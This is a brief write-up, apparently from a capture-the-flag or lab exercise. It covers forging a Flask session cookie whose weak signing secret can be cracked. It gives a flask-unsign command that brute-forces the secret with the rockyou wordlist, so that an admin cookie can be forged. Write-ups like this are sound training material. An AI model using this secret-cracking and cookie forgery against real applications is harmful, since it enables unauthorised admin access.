# Package Flask Session Forgery

## Analysis
The app uses Flask session cookies with a weak secret key.

## Exploitation
Use `flask-unsign` to derive the secret and forge an admin cookie.

```bash
flask-unsign --unsign --cookie "$COOKIE" --wordlist ./rockyou.txt
```

